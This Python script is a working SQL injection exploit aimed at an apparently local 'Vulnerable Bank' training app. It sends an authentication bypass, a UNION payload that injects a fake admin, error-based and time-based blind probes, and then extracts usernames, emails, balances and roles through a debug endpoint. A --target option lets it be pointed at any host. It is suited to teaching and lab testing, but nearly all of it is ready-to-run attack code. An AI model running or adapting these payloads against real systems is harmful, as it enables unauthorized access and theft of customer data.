#!/usr/bin/env python3
"""
SQL Injection Exploit - Vulnerable Bank (DEBUG VERSION)
=======================================================
This script demonstrates SQL injection attacks with ENHANCED DEBUGGING.
"""

import requests
import sys
import time

# Target configuration
TARGET_URL = "http://localhost:8080"
LOGIN_ENDPOINT = f"{TARGET_URL}/login"

def print_banner():
    print("=" * 60)
    print("SQL Injection Exploit - Vulnerable Bank (DEBUG MODE)")
    print("=" * 60)
    print()

def check_server_availability():
    """Checks if the target server is reachable before running tests."""
    print(f"[*] Checking connectivity to {TARGET_URL}...")
    try:
        response = requests.get(TARGET_URL, timeout=5)
        print(f"[+] Server is UP. Status code: {response.status_code}")
        return True
    except requests.exceptions.ConnectionError:
        print(f"[-] CRITICAL ERROR: Unable to connect to {TARGET_URL}")
        print("[-] HINT: Is the 'Vulnerable Bank' server running?")
        print("[-] HINT: Check if the port (8080) is correct.")
        return False
    except Exception as e:
        print(f"[-] Error checking server: {e}")
        return False

def test_basic_bypass():
    """Test 1: Authentication Bypass using OR '1'='1'"""
    print("\n[*] Test 1: Basic Authentication Bypass")
    # Using # for MySQL comment. 
    # NOTE: 'OR 1=1' returns ALL users, which might crash the server (Unread result found).
    # We use "admin' #" to select ONLY the admin user.
    payload = "admin' #" 
    print(f"[*] Payload: {payload}")

    data = {
        'username': payload,
        'password': "anything"
    }

    try:
        response = requests.post(LOGIN_ENDPOINT, data=data, allow_redirects=False)
        
        # Check for 302 Redirect OR if we are already on the dashboard (200 OK)
        if (response.status_code == 302 and 'dashboard' in response.headers.get('Location', '')) or \
           (response.status_code == 200 and ('dashboard' in response.text.lower() or 'панель керування' in response.text.lower())):
            print("[+] SUCCESS! Authentication bypassed!")
            if response.status_code == 302:
                print(f"[+] Redirect Location: {response.headers.get('Location')}")
            else:
                print(f"[+] Server returned 200 OK with Dashboard content.")
            return True
        else:
            print("[-] FAILED: Could not bypass authentication")
            print(f"    Status Code: {response.status_code}")
            # Show part of the body to see if there is an error message
            print(f"    Response Body Preview: {response.text[:200]}...")
            return False
    except Exception as e:
        print(f"[-] EXCEPTION during request: {e}")
        return False

def test_union_injection():
    """Test 2: UNION-based SQL Injection"""
    print("\n[*] Test 2: UNION-based SQL Injection")
    # Note: NOW() is MySQL specific. SQLite uses datetime('now'). 
    print("[*] NOTE: This payload uses MySQL syntax (NOW()).")
    
    # Using # for comment
    payload = "' UNION SELECT 1,'injected_admin','injected_pass','fake@email.com','9999999999',10000.00,'admin','000-00-0000','+380501111111','Injected Address',NOW(),NOW(),TRUE #"
    print("[*] Sending UNION payload...")

    data = {
        'username': payload,
        'password': "injected_pass"
    }

    try:
        response = requests.post(LOGIN_ENDPOINT, data=data, allow_redirects=False)

        if response.status_code == 302 or (response.status_code == 200 and 'dashboard' in response.text.lower()):
            print("[+] UNION injection successful!")
        elif response.status_code == 500:
            print("[-] Server Error (500). Causes could be:")
            print("    1. Database syntax mismatch (e.g., using MySQL functions on SQLite).")
            print("    2. Incorrect number of columns in UNION SELECT.")
            print(f"    Response: {response.text[:200]}")
        else:
            print(f"[-] UNION injection failed. Status: {response.status_code}")
            print(f"    Response: {response.text[:200]}")
    except Exception as e:
        print(f"[-] EXCEPTION: {e}")

def test_error_based():
    """Test 3: Error-based SQL Injection"""
    print("\n[*] Test 3: Error-based SQL Injection")
    print("[*] Payload: admin' AND 1=CONVERT(int, (SELECT @@version)) #")

    data = {
        'username': "admin' AND 1=CONVERT(int, (SELECT database())) #",
        'password': "anything"
    }

    try:
        response = requests.post(LOGIN_ENDPOINT, data=data)

        if 'error' in response.text.lower() or 'exception' in response.text.lower():
            print("[+] Error message received - error-based injection possible!")
            print(f"[+] Response snippet: {response.text[:200]}")
        else:
            print("[-] No explicit error message in response.")
            print(f"    Status Code: {response.status_code}")
    except Exception as e:
        print(f"[-] EXCEPTION: {e}")

def test_time_based():
    """Test 4: Time-based Blind SQL Injection"""
    print("\n[*] Test 4: Time-based Blind SQL Injection")
    print("[*] NOTE: SLEEP() is MySQL specific.")
    print("[*] Payload: admin' AND SLEEP(5) #")

    data = {
        'username': "admin' AND SLEEP(5) #",
        'password': "anything"
    }

    try:
        start_time = time.time()
        response = requests.post(LOGIN_ENDPOINT, data=data, timeout=10)
        elapsed_time = time.time() - start_time

        if elapsed_time >= 5:
            print(f"[+] Time-based injection successful! Delay: {elapsed_time:.2f}s")
        else:
            print(f"[-] No significant delay detected: {elapsed_time:.2f}s")
            if response.status_code == 500:
                print("    (Server returned 500 Error - likely SLEEP() function not found in DB)")
    except requests.exceptions.ReadTimeout:
        print("[+] Request timed out (This might indicate success if timeout < sleep time)")
    except Exception as e:
        print(f"[-] EXCEPTION: {e}")

def extract_users():
    """Extract user data using SQL injection"""
    print("\n[*] Test 5: Data Extraction")
    print("[*] Extracting user list...")

    session = requests.Session()
    # 1. Login
    try:
        # Use # for comment
        login_data = {'username': "admin' #", 'password': "x"}
        session.post(LOGIN_ENDPOINT, data=login_data)
        
        # 2. Extract
        debug_url = f"{TARGET_URL}/sql_debug?query=SELECT username,email,balance,role FROM users"
        response = session.get(debug_url)

        if response.status_code == 200:
            print("[+] Data extracted successfully!")
            try:
                data = response.json()
                if 'error' in data:
                     print(f"[-] API returned error: {data['error']}")
                else:
                    print(f"[+] Found {len(data.get('results', []))} users:")
                    for user in data.get('results', []):
                        print(f"    - {user.get('username')} ({user.get('role')})")
            except:
                print(f"[!] Could not parse JSON response. Raw: {response.text[:100]}")
        elif response.status_code == 404:
             print("[-] Endpoint /sql_debug not found (404).")
        else:
            print(f"[-] Data extraction failed. Status: {response.status_code}")
    except Exception as e:
        print(f"[-] EXCEPTION: {e}")

def main():
    print_banner()

    # Allow CLI override of target
    if len(sys.argv) > 1 and sys.argv[1] == '--target':
        global TARGET_URL, LOGIN_ENDPOINT
        TARGET_URL = sys.argv[2]
        LOGIN_ENDPOINT = f"{TARGET_URL}/login"

    # CRITICAL: Check if server is running first
    if not check_server_availability():
        sys.exit(1)

    print(f"[*] Target: {TARGET_URL}")
    print("[*] Starting SQL Injection tests...\n")

    test_basic_bypass()
    test_union_injection()
    test_error_based()
    test_time_based()
    extract_users()

    print("\n" + "=" * 60)
    print("[*] Tests completed.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)